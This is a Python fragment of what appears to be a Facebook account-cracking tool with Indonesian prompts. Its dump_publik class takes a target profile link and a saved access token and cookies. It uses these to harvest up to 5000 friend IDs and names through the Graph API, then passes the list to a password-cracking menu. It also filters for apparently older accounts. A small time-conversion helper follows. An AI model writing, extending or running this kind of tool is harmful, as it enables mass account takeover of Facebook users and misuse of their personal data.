class dump_publik:
	def __init__(self):
		self.new = []
		self.old = []
		self.id=[]
		self.filih()
	def filih(self):
		wibu().print(Panel(Align.center("[01]. Dump Massal\n[02]. Dump Singgle")))
		z = input("[?] Pilih: ")
		if z in["1","01"]:
			self.massal()
		else:
			self.singgle()
	def singglenewid(self):
		self.warning()
		ses = requests.Session()
		linx = input("[?] Link Akun Target: ")
		id = self.convert(linx)
		try:
			x = ses.get(f"https://graph.facebook.com/{id}?fields=name,friends.fields(id,name).limit(5000)&access_token={self.token()}",cookies=getco())
			m = json.loads(x.text)
			for a in m["friends"]["data"]:
				id=a["id"]
				nm=a["name"]
				if int(id[4])<5:
					self.id.append(f"{id}<=>{nm}")
				else:
					pass
		except Exception as e:
			print(e)
		crackmenu().passmenu(self.id)
	def massal(self):
		ses = requests.Session()
		self.warning()
		jum = int(input("[?] Jumlah Dump: "))
		for a in range(jum):
			a+=1
			linx=input(f"[{a}] Link Akun Target: ")
			id=self.convert(linx)
			try:
				x = ses.get(f"https://graph.facebook.com/{id}?fields=name,friends.fields(id,name).limit(5000)&access_token={self.token()}",cookies=getco())
				m = json.loads(x.text)
				for i in m["friends"]["data"]:
					self.id.append(f"{i['id']}<=>{i['name']}")
			except:
				pass
			
	def token(self):
		try:
			x = open("login/token.json","r").read()
		except:
			x=""
		return x
	def warning(self):
		kz = miku("# Harap Masukan Link Akun Target",style="bright_white")
		z = wibu().print(Panel(kz,title="warning",style="purple3"))
		return z
	def singgle(self):
		ses = requests.Session()
		self.warning()
		linx = input("[?] Link Akun Target: ")
		id = self.convert(linx)
		try:
			x = ses.get(f"https://graph.facebook.com/{id}?fields=name,friends.fields(id,name).limit(5000)&access_token={self.token()}",cookies=getco())
			t = json.loads(x.text)
			for i in t["friends"]["data"]:
				self.id.append(i['id']+"<=>"+i["name"])
		except:
			pass
		crackmenu().passmenu(self.id)
	def convert(self,link):
		if "profile.php" in link:
			idt = re.findall('id=(.*)',str(link))[0]
		elif ".com/" in link:
			idt = re.findall("com/(.*)",link)[0]
		else:
			idt=link
		r = requests.get(f"https://mbasic.facebook.com/{idt}").text
		try:
			user = re.findall('\;rid\=(\d+)\&',str(r))[0]
		except:
			user=idt
		return user

class waktu:
	def __init__(self,total):
		self.Total_Waktu = total

	def zero_insert(self,input_string):
		if len(input_string)==1:
			return input_string
		return input_string

	def time_convert(self):
		input_sec=self.Total_Waktu
		input_minute=input_sec//60
		input_sec=int(input_sec-input_minute*60)
		input_hour=input_minute//60
		input_minute=int(input_minute-input_hour*60)
		input_day=int(input_hour//24)
		input_hour=int(input_hour-input_day*24)

		return self.zero_insert(str(input_minute)),self.zero_insert(str(input_sec))

